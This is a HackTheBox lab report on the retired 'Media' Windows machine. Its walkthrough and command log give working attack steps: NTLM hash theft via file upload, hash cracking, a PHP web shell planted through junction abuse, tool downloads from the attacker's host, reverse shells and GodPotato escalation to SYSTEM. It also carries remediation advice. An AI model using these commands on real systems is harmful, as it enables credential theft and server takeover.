# Media — HackTheBox Report

| Difficulty | OS      | Category |
| ---------- | ------- | -------- |
| Medium     | Windows | Web      |

> This report was written for educational and portfolio purposes only. Media is a retired HackTheBox machine.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Scope](#scope)
3. [Approach / Methodology](#approach--methodology)
4. [Tools Used](#tools-used)
5. [Assessment Summary (Findings Overview)](#assessment-summary-findings-overview)
6. [Attack Chain Walkthrough](#attack-chain-walkthrough)
7. [Technical Findings Details](#technical-findings-details)
8. [Remediation Summary](#remediation-summary)
9. [Lessons Learned / Skills Demonstrated](#lessons-learned--skills-demonstrated)
10. [Appendix](#appendix)

---

## Executive Summary

**Target:** `MEDIA / 10.129.77.26`  
**Platform:** `HackTheBox`  
**Date Completed:** `2026-10-14`  
**Assessment Type:** `Standalone Windows Server`  
**Approach:** `Black-box` — no credentials were provided at the start of testing.

Pheenix Security was engaged to conduct a simulated attack against the HackTheBox Media environment. Testing began with no prior access or knowledge of the target — representing the position of an attacker who has identified an organization's public-facing website.

Four security issues were identified that, when chained together, allowed our team to achieve complete control of the server. The attack began with the organization's own website: a job application page that accepted file uploads without any restrictions on file type. Uploading a specially crafted file caused the server to send a hidden authentication request back to our testing machine, which we used to capture and crack a staff member's password in seconds.

Once logged in with those credentials, our team discovered that the server stored uploaded files in a predictable location using a predictable naming scheme. This allowed us to redirect the file storage location to the website's own content folder, then upload a hidden backdoor file through the job application form. Through that backdoor, we gained direct control over the server. A final step used a known Windows privilege technique to elevate our access from a restricted built-in account to the most powerful account on the system.

In a real-world scenario, this level of access would allow an attacker to read, modify, or delete all data on the server, create or remove user accounts, and use the compromised server as a launch point for attacks against other systems on the network.

**Overall Risk Rating: High**

---

## Scope

| Host / URL / IP Address | Description |
| ----------------------- | ----------- |
| MEDIA                   | Windows standalone server (workgroup: MEDIA) |
| media.v1                | Web application hostname |
| 10.129.77.26            | Target IP address |

Testing was conducted exclusively within the HackTheBox lab environment. No production systems were accessed or impacted.

---

## Approach / Methodology

1. **Reconnaissance** — Identified open ports and services via Nmap. Added the target hostname to `/etc/hosts` for reliable name resolution throughout testing.
2. **Scanning & Enumeration** — Identified the web application running on port 80 and reviewed its publicly accessible features, including the file upload form on the hiring page.
3. **Vulnerability Analysis** — Identified the absence of server-side file type validation on the upload form. Analyzed the PHP source code to understand the upload directory structure and naming logic. Generated NTLM-theft payloads targeting the file upload vector.
4. **Exploitation** — Captured the NTLMv2 hash of local user `enox` via Responder, cracked it offline, and logged in via SSH to obtain the user flag.
5. **Privilege Escalation** — Leveraged predictable upload directory naming and write permissions to create a Windows Directory Junction redirecting uploads to the Apache web root. Uploaded a PHP web shell, obtained a reverse shell as `NT AUTHORITY\LOCAL SERVICE`, then escalated to `SYSTEM` using FullPowers and GodPotato.
6. **Post-Exploitation** — Confirmed full system control as `SYSTEM` and retrieved the root flag.

---

## Tools Used

| Tool                  | Purpose                                                         |
| --------------------- | --------------------------------------------------------------- |
| Nmap                  | Network port and service enumeration                            |
| ntlm_theft            | Generation of malicious files for NTLM hash capture             |
| Responder             | NTLM hash interception via rogue SMB server                     |
| hashcat               | Offline password hash cracking (mode 5600 — NetNTLMv2)         |
| FullPowers.exe        | Recovery of default service account privileges (SeImpersonatePrivilege) |
| GodPotato-NET4.exe    | COM-based local privilege escalation via SeImpersonatePrivilege |
| Netcat                | Reverse shell listener                                          |
| curl                  | Web request verification and reverse shell delivery             |

---

## Assessment Summary (Findings Overview)

| Severity      | Count |
| ------------- | ----- |
| Critical      | 0     |
| High          | 3     |
| Medium        | 1     |
| Low           | 0     |
| Informational | 0     |

| # | Severity | Finding Name |
| - | -------- | ------------ |
| 1 | High     | Unrestricted File Upload Enabling NTLM Hash Capture |
| 2 | High     | Arbitrary File Write to Web Root via Windows Directory Junction |
| 3 | High     | Local Privilege Escalation via SeImpersonatePrivilege (GodPotato) |
| 4 | Medium   | Weak Password on Local User Account |

---

## Attack Chain Walkthrough

### 1.1. Reconnaissance

A full-port Nmap scan identified three open services: SSH (port 22), an Apache web server on port 80 running PHP 8.1 on Windows, and Remote Desktop on port 3389. The machine identified itself as `MEDIA` — a standalone workgroup machine.

```bash
sudo nmap 10.129.77.26 -p- -sC -sV -Pn -v
```

```text
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The target hostname was added to `/etc/hosts`:

```bash
echo "10.129.77.26 media.v1" | sudo tee -a /etc/hosts
```

Browsing port 80 revealed "ProMotion Studio," a web agency site with a "Hiring" section containing a file upload form for job applicants.

![ProMotion Studio — Port 80 web application](./images/Pasted%20image%2020261007062530.png)

---

### 2.1. NTLM Hash Capture via Malicious File Upload

The hiring form accepted file uploads without any server-side file type validation. The `ntlm_theft` tool was used to generate a set of malicious files that, when processed by Windows, trigger an outbound SMB authentication to an attacker-controlled host.

```bash
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
python3 ntlm_theft.py -g all -s 10.129.77.26 -f media
```

Responder was started on the attacker's tunnel interface to intercept incoming NTLM authentication attempts:

```bash
sudo responder -I tun0
```

A generated `.asx` media playlist file was uploaded through the hiring form. When the server processed the file, Windows automatically resolved the embedded UNC path, triggering an outbound SMB connection that Responder intercepted.

![Hiring form — malicious ASX file uploaded via the job application form](./images/Pasted%20image%2020261007070016.png)

![Responder — NTLMv2 hash captured for MEDIA\enox](./images/Pasted%20image%2020261007070233.png)

```text
enox::MEDIA:9bf38293750f8c49:F95718BFA19EBBBE26190799A3EF8F3D:01010000000000000078FA512956DD01
58057BDDB772A5A00000000002000800580052003500520001001E00570049004E002D00380057004700
30005900590039004F0042005500310004003400570049004E002D0038005700470030005900590039
004F004200550031002E0058005200350052002E004C004F00430041004C000300140058005200350052
002E004C004F00430041004C000500140058005200350052002E004C004F00430041004C00070008000078FA51
2956DD010600040002000000080030003000000000000000000000000030000068DF257DA334E6FB106D
02FDAFC9768B73C7D61A2EC493637E5CA9A0B3818F8D0A001000000000000000000000000000000000000900
220063006900660073002F00310030002E00310030002E00310034002E003100380038000000000000000000
```

---

### 2.2. NTLMv2 Hash Cracking and SSH Foothold / User Flag

The captured hash was saved and cracked offline using hashcat with the `rockyou.txt` wordlist:

```bash
hashcat -a 0 enox.hash rockyou.txt
```

```text
hashcat (v6.2.6) starting in autodetect mode

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

ENOX::MEDIA:9bf38293750f8c49:f95718bfa19ebbbe26190799a3ef8f3d:...:1234virus@

Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Started.....: Wed Oct  7 07:01:xx 2026 (0 secs)
Recovered........: 1/1 (100.00%)
```

Credentials recovered: `enox : 1234virus@`

SSH access was established using the cracked credentials, and the user flag was retrieved:

```bash
ssh enox@10.129.77.26
```

```text
enox@MEDIA C:\Users\enox>type c:\users\enox\desktop\user.txt
0a67fddacccb4a57f91ca6bc5b8cc152
```

---

### 3.1. Source Code Review — Upload Directory Discovery

From the `enox` shell, a directory listing of `C:\` revealed a XAMPP installation:

```text
enox@MEDIA C:\>dir

04/15/2025  09:02 PM    <DIR>          inetpub
04/15/2025  08:24 PM    <DIR>          Program Files
10/02/2023  11:03 AM    <DIR>          xampp
```

Reviewing the PHP source for `C:\xampp\htdocs\index.php` revealed two critical details about how uploads were stored:

```text
$uploadDir = 'C:/Windows/Tasks/Uploads/';
$folderName = md5($firstname . $lastname . $email);
$targetDir = $uploadDir . $folderName . '/';
```

The subdirectory name for each upload was the MD5 hash of the submitter's first name, last name, and email — all values supplied by the attacker through the form. Using the previously submitted values (`test`, `test`, `test@gmail.com`), the upload directory was calculated:

```bash
echo -n "testtesttest@gmail.com" | md5sum
# 44b85c98e94039c8a0a015f6d3a3449e
```

---

### 3.2. PHP Web Shell via Windows Directory Junction

A Windows Directory Junction acts like a symbolic link for folders — any file written into the Junction path is transparently redirected to the Junction's target. The calculated upload directory was removed and replaced with a Junction pointing to the Apache web root:

```powershell
remove-item .\44b85c98e94039c8a0a015f6d3a3449e\ -Recurse
New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e" -Target "C:\xampp\htdocs"
```

A PHP web shell was created on the attacker machine:

```bash
cat << EOF > cmd.php
<?php
system($_GET['cmd']);
?>
EOF
```

The hiring form was submitted again with the same values (`test`, `test`, `test@gmail.com`) and `cmd.php` as the uploaded file. Because the upload folder was now a Junction to the web root, the shell landed in `C:\xampp\htdocs`:

```text
PS C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e> dir

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/14/2026   1:23 PM             26 cmd.php
-a----        10/10/2023   5:00 AM          20563 index.php
```

---

### 3.3. Remote Code Execution as NT AUTHORITY\LOCAL SERVICE

Remote code execution was confirmed via a curl request to the web shell:

```bash
curl http://media.v1/cmd.php?cmd=whoami
```

```text
nt authority\local service
```

A base64-encoded PowerShell reverse shell was delivered through the web shell parameter, and a Netcat listener received the connection:

```text
┌─[us-dedivip-5]─[10.10.14.188]─[pheenixx@htb-mps9ee9vhm]─[~]
└──╼ [★]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.77.26 57433
whoami
nt authority\local service
```

---

### 4.1. Privilege Token Recovery — FullPowers

The Apache service was running as `NT AUTHORITY\LOCAL SERVICE`, which had a restricted token missing `SeImpersonatePrivilege`. `FullPowers.exe` was uploaded and executed to recover the default service account privilege set:

```text
PS C:\xampp\htdocs> iwr http://10.10.14.188:8000/FullPowers.exe -UseBasicParsing -OutFile FullPowers.exe
PS C:\xampp\htdocs> iwr http://10.10.14.188:8000/GodPotato-NET4.exe -UseBasicParsing -OutFile GodPotato-NET4.exe
```

```powershell
.\FullPowers.exe -c 'powershell -e <base64_encoded_reverse_shell>'
```

```text
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

---

### 4.2. SeImpersonatePrivilege Abuse via GodPotato / Root Flag

With `SeImpersonatePrivilege` recovered, `GodPotato-NET4.exe` was used to escalate to `SYSTEM` via COM-based token impersonation:

```powershell
.\GodPotato-NET4.exe -cmd 'powershell -e <base64_encoded_reverse_shell>'
```

The root flag was retrieved from the Administrator's desktop:

```text
PS C:\xampp\htdocs> type c:\users\administrator\desktop\root.txt
6b7c6fc51671478650d36b109c4a42b0
```

---

## Technical Findings Details

### 1. Unrestricted File Upload Enabling NTLM Hash Capture — High

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **CVSS 3.1 Score** | 8.1 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N |
| **Description (Incl. Root Cause)** | The ProMotion Studio hiring page accepted file uploads without server-side file type or extension validation. Although the form's UI specified video files, no enforcement occurred on the server. Files such as `.asx` (Windows Media Player playlists) containing attacker-controlled UNC paths were accepted and stored. When the server or a user processed these files, Windows automatically resolved the embedded UNC path — initiating an outbound SMB authentication request to the attacker's machine. The root cause is the complete absence of server-side file type enforcement combined with a Windows environment that auto-resolves UNC paths embedded in media files. |
| **Security Impact** | An unauthenticated attacker can capture the NTLMv2 hash of any Windows account that processes the uploaded file. Offline cracking can recover the plaintext password, providing authenticated access to the system via SSH or RDP. |
| **Affected Host(s)** | MEDIA (10.129.77.26) — `C:\xampp\htdocs\index.php` upload handler |
| **Remediation** | - Implement server-side file type validation using MIME type detection and extension allowlisting (permit only `.mp4`, `.avi`, `.mov`, `.wmv`) — Block files with extensions known to trigger UNC path resolution (`.asx`, `.lnk`, `.url`, `.scf`, `.m3u`, `.xml`) — Block outbound SMB (ports 445 and 139) at the perimeter and host-based firewall to prevent NTLMv2 hash exfiltration even if a malicious file is uploaded — Store uploaded files outside the web root and rename them to random strings on receipt |
| **References** | https://attack.mitre.org/techniques/T1187/ — https://cwe.mitre.org/data/definitions/434.html — https://github.com/Greenwolf/ntlm_theft |

**Evidence:**

```text
sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.77.26
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:9bf38293750f8c49:F95718BFA19EBBBE26190799A3EF8F3D:...

hashcat -a 0 enox.hash rockyou.txt

ENOX::MEDIA:9bf38293750f8c49:...:1234virus@
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Started.....: Wed Oct  7 07:01 2026 (0 secs)
Recovered........: 1/1 (100.00%)
```

---

### 2. Arbitrary File Write to Web Root via Windows Directory Junction — High

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |
| **CVSS 3.1 Score** | 8.8 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **Description (Incl. Root Cause)** | The application computed upload subdirectory names deterministically using `md5($firstname . $lastname . $email)` — all values supplied by the uploader. Because the formula is visible in the PHP source code and the output is fully predictable, an authenticated attacker can calculate the exact upload path for any form submission. This allowed the `enox` account to delete the known upload directory and replace it with a Windows Directory Junction pointing to `C:\xampp\htdocs`. Any subsequent upload using the same form values wrote the file directly into the Apache document root, enabling placement of an executable PHP web shell accessible over the network. The root cause is a combination of predictable path generation and insufficient restrictions on write access and Junction creation within `C:\Windows\Tasks\Uploads\`. |
| **Security Impact** | Any authenticated local user can plant a PHP web shell in the web root, achieving unauthenticated remote code execution from any host that can reach port 80. This bypasses filesystem access controls and escalates a local user account to remote server control. |
| **Affected Host(s)** | MEDIA (10.129.77.26) — `C:\Windows\Tasks\Uploads\`, `C:\xampp\htdocs\` |
| **Remediation** | - Generate upload subdirectory names using a cryptographically random value (e.g., `random_bytes(16)`) rather than a deterministic hash of user-supplied input — Restrict write and Junction/symlink creation permissions on `C:\Windows\Tasks\Uploads\` to the web service account only, not to interactive users — Move the upload storage path to a separate volume outside the web root — Disable PHP execution in the upload directory via Apache configuration (`php_flag engine off`) |
| **References** | https://attack.mitre.org/techniques/T1574/ — https://cwe.mitre.org/data/definitions/22.html — https://learn.microsoft.com/en-us/windows/win32/fileio/hard-links-and-junctions |

**Evidence:**

```text
remove-item .\44b85c98e94039c8a0a015f6d3a3449e\ -Recurse
New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e" -Target "C:\xampp\htdocs"

# Upload cmd.php via web form — file lands in web root due to Junction
curl http://media.v1/cmd.php?cmd=whoami
nt authority\local service
```

---

### 3. Local Privilege Escalation via SeImpersonatePrivilege (GodPotato) — High

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-269: Improper Privilege Management |
| **CVSS 3.1 Score** | 7.8 (High) — AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **Description (Incl. Root Cause)** | Apache/XAMPP ran as `NT AUTHORITY\LOCAL SERVICE`. When this account is spawned through certain mechanisms (such as a web server child process), Windows strips `SeImpersonatePrivilege` from its token. The `FullPowers.exe` utility exploited a documented Windows behavior to create a scheduled task under the service account's full default token, recovering `SeImpersonatePrivilege`. With that privilege in hand, `GodPotato-NET4.exe` exploited a COM server vulnerability to impersonate a `SYSTEM`-level token and execute a command as `SYSTEM`. The root cause is that a publicly accessible web server was running under a built-in Windows service account that holds impersonation privileges by default, with no compensating controls to prevent token recovery or token impersonation. |
| **Security Impact** | Any code execution achieved under `NT AUTHORITY\LOCAL SERVICE` can unconditionally escalate to `SYSTEM` on Windows Server systems where these tools can be written and executed. Full system control allows modification of all files, creation of backdoor accounts, and disabling of security controls. |
| **Affected Host(s)** | MEDIA (10.129.77.26) — Apache XAMPP process (`NT AUTHORITY\LOCAL SERVICE`) |
| **Remediation** | - Run Apache/XAMPP under a dedicated low-privilege local service account explicitly denied `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` — Apply Group Policy to restrict which accounts may hold impersonation privileges — Enable process creation auditing (Event ID 4688) and alert on known escalation tool names (GodPotato, JuicyPotato, PrintSpoofer, FullPowers) — Keep Windows Server fully patched; newer patches reduce the effectiveness of COM-based impersonation exploits |
| **References** | https://attack.mitre.org/techniques/T1134/001/ — https://cwe.mitre.org/data/definitions/269.html — https://github.com/BeichenDream/GodPotato — https://github.com/itm4n/FullPowers |

**Evidence:**

```text
.\FullPowers.exe -c 'powershell -e ...'

Privilege Name                Description                               State
SeImpersonatePrivilege        Impersonate a client after authentication Enabled

.\GodPotato-NET4.exe -cmd 'powershell -e ...'

PS C:\xampp\htdocs> type c:\users\administrator\desktop\root.txt
6b7c6fc51671478650d36b109c4a42b0
```

---

### 4. Weak Password on Local User Account — Medium

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-521: Weak Password Requirements |
| **CVSS 3.1 Score** | 6.5 (Medium) — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N |
| **Description (Incl. Root Cause)** | The NTLMv2 hash captured for the `enox` account was cracked in under one second using the `rockyou.txt` wordlist. The plaintext password — `1234virus@` — is a short, common dictionary-based password. The root cause is the absence of a password complexity policy or length requirement preventing easily guessable passwords from being set on local accounts. |
| **Security Impact** | Near-instant offline cracking of the captured hash provided SSH access to the server as `enox`, yielding the user flag and enabling all subsequent privilege escalation steps. Without a weak password, the hash capture would not have produced actionable credentials. |
| **Affected Host(s)** | MEDIA (10.129.77.26) — local user account: enox |
| **Remediation** | - Enforce a minimum password length of 15 or more characters for all local accounts — Supplement Windows password complexity requirements with a wordlist filter that blocks common patterns and dictionary words — Enforce account lockout policies for online authentication; note that lockout does not prevent offline cracking of captured hashes — Focus on blocking hash capture (Finding 1) as the primary defense; strong passwords are a secondary control |
| **References** | https://attack.mitre.org/techniques/T1110/002/ — https://cwe.mitre.org/data/definitions/521.html |

**Evidence:**

```text
hashcat -a 0 enox.hash rockyou.txt

ENOX::MEDIA:9bf38293750f8c49:...:1234virus@

Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Started.....: Wed Oct  7 07:01 2026 (0 secs)
Recovered........: 1/1 (100.00%)
Candidates.#1....: 123456 -> lovers1
```

---

## Remediation Summary

### Short Term

- Block outbound SMB (ports 445 and 139) at the host-based and perimeter firewall immediately to prevent future NTLM hash exfiltration via malicious file uploads.
- Implement server-side file type validation on the hiring form; permit only legitimate video file extensions and reject all file types known to trigger UNC path resolution.
- Rotate the `enox` account password to a minimum 20-character random value.

### Medium Term

- Refactor the upload directory naming scheme to use a cryptographically random identifier instead of a predictable MD5 hash of user-supplied form values.
- Restrict write permissions on `C:\Windows\Tasks\Uploads\` to prevent low-privilege local users from deleting directories or creating Junctions within it.
- Migrate the Apache/XAMPP service to a dedicated low-privilege service account that does not hold `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

### Long Term

- Enforce a minimum 15-character password length and screen against common wordlists for all local accounts.
- Relocate file upload storage to a dedicated volume outside the web root, served through a download endpoint rather than direct file path access; disable PHP execution in any directory that receives uploaded content.
- Enable process creation auditing (Event ID 4688) and configure alerting for known privilege escalation tool names (GodPotato, JuicyPotato, PrintSpoofer, FullPowers).
- Conduct periodic security reviews of web application source code, specifically targeting file upload handling logic and any code paths that construct filesystem paths from user-controlled input.

---

## Lessons Learned / Skills Demonstrated

- **NTLM theft via malicious file upload** — Generated NTLM-theft payloads using `ntlm_theft` and used Responder to intercept NTLMv2 hashes over SMB, exploiting Windows' automatic UNC path resolution behavior in media and shortcut file types.
- **NetNTLMv2 hash cracking (hashcat mode 5600)** — Cracked a captured NTLMv2 hash offline using a dictionary attack, recovering plaintext credentials in under one second.
- **Web application source code analysis** — Identified a deterministic upload path generation scheme by reviewing PHP source code on a remote shell, enabling precise calculation of the upload directory for any form submission.
- **Windows Directory Junction abuse** — Replaced a known upload directory with a Junction pointing to the Apache web root, transparently redirecting all subsequent uploads to the document root and enabling web shell placement without direct write access to the web root.
- **PHP web shell deployment and reverse shell delivery** — Created a minimal PHP command execution shell, delivered it via Junction abuse, confirmed RCE, and escalated to an interactive reverse shell via a base64-encoded PowerShell payload.
- **Service account privilege token recovery with FullPowers** — Restored `SeImpersonatePrivilege` to a restricted `NT AUTHORITY\LOCAL SERVICE` token using `FullPowers.exe`, exploiting the Windows scheduled task mechanism to spawn a process with the account's full default privilege set.
- **SeImpersonatePrivilege escalation via GodPotato** — Leveraged the recovered `SeImpersonatePrivilege` and COM token impersonation to escalate from `NT AUTHORITY\LOCAL SERVICE` to `SYSTEM`.

---

## Appendix

### A. Finding Severity Definitions

| Rating        | Definition |
| ------------- | ---------- |
| Critical      | Exploitation is straightforward and leads directly to full system or domain compromise with minimal prerequisites. |
| High          | Exploitation provides significant access or enables further exploitation with low complexity. |
| Medium        | Exploitation requires additional conditions or access but represents a meaningful security risk. |
| Low           | Limited impact; exploitation is difficult or requires unlikely conditions. |
| Informational | No direct risk; noted for awareness or defense-in-depth improvement. |

---

### B. Exploited Hosts

| Host                 | Method                                   | Notes                             |
| -------------------- | ---------------------------------------- | --------------------------------- |
| MEDIA (10.129.77.26) | SSH — enox:1234virus@                    | User flag recovered               |
| MEDIA (10.129.77.26) | Web shell + GodPotato (SYSTEM)           | Root flag recovered; full system control |

---

### C. Compromised Users / Credentials

| Username                     | Method                                          | Notes                              |
| ---------------------------- | ----------------------------------------------- | ---------------------------------- |
| enox                         | NTLM theft + hashcat mode 5600 (NetNTLMv2)      | Password: 1234virus@               |
| NT AUTHORITY\LOCAL SERVICE   | Web shell via Directory Junction abuse           | Service context — no password      |
| SYSTEM                       | SeImpersonatePrivilege abuse via GodPotato       | Full system control                |

---

### D. Command Reference Log

```bash
# Reconnaissance
sudo nmap 10.129.77.26 -p- -sC -sV -Pn -v
echo "10.129.77.26 media.v1" | sudo tee -a /etc/hosts

# NTLM theft payload generation
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
python3 ntlm_theft.py -g all -s 10.129.77.26 -f media

# Hash interception
sudo responder -I tun0

# Hash cracking
hashcat -a 0 enox.hash rockyou.txt

# SSH access
ssh enox@10.129.77.26

# Junction creation (from enox shell)
remove-item .\44b85c98e94039c8a0a015f6d3a3449e\ -Recurse
New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e" -Target "C:\xampp\htdocs"

# Web shell creation (attacker machine)
cat << EOF > cmd.php
<?php
system($_GET['cmd']);
?>
EOF

# RCE verification
curl http://media.v1/cmd.php?cmd=whoami

# Tool transfer (from local service reverse shell)
iwr http://10.10.14.188:8000/FullPowers.exe -UseBasicParsing -OutFile FullPowers.exe
iwr http://10.10.14.188:8000/GodPotato-NET4.exe -UseBasicParsing -OutFile GodPotato-NET4.exe

# Token recovery
.\FullPowers.exe -c 'powershell -e <base64_reverse_shell>'

# SYSTEM escalation
.\GodPotato-NET4.exe -cmd 'powershell -e <base64_reverse_shell>'
```

---

### E. References

- [MITRE ATT&CK — T1187: Forced Authentication (NTLM Theft)](https://attack.mitre.org/techniques/T1187/)
- [MITRE ATT&CK — T1574: Hijack Execution Flow (Junction Abuse)](https://attack.mitre.org/techniques/T1574/)
- [MITRE ATT&CK — T1134.001: Access Token Manipulation — Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)
- [MITRE ATT&CK — T1110.002: Brute Force — Password Cracking](https://attack.mitre.org/techniques/T1110/002/)
- [HackTheBox — Media](https://www.hackthebox.com/machines/media)
- [ntlm_theft — Greenwolf](https://github.com/Greenwolf/ntlm_theft)
- [GodPotato — BeichenDream](https://github.com/BeichenDream/GodPotato)
- [FullPowers — itm4n](https://github.com/itm4n/FullPowers)

> No CVEs apply directly to this assessment. All findings relate to web application misconfigurations, Windows design behaviors (UNC path auto-resolution, Directory Junction support), default service account privilege sets, and weak password practices.
